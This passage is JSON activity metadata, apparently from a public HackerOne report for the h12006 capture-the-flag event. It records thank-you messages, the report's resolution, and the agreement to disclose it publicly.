site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:02:56.759Z","updated_at":"2020-06-11T23:02:56.759Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324975,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:28:24.055Z","updated_at":"2020-06-17T22:28:24.055Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"nirvana_msu","url":"/nirvana_msu"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8345856,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-19T18:01:39.104Z","updated_at":"2020-06-19T18:01:39.104Z","first_to_agree":true,"actor":{"username":"nirvana_msu","cleared":true,"url":"/nirvana_msu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/451/521/1d0f6443db7f9182f369d52763f1e423273fd58c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8345910,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-19T18:07:46.661Z","updated_at":"2020-06-19T18:07:46.661Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8345911,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-19T18:07:46.762Z","updated_at":"2020-06-19T18:07:46.762Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}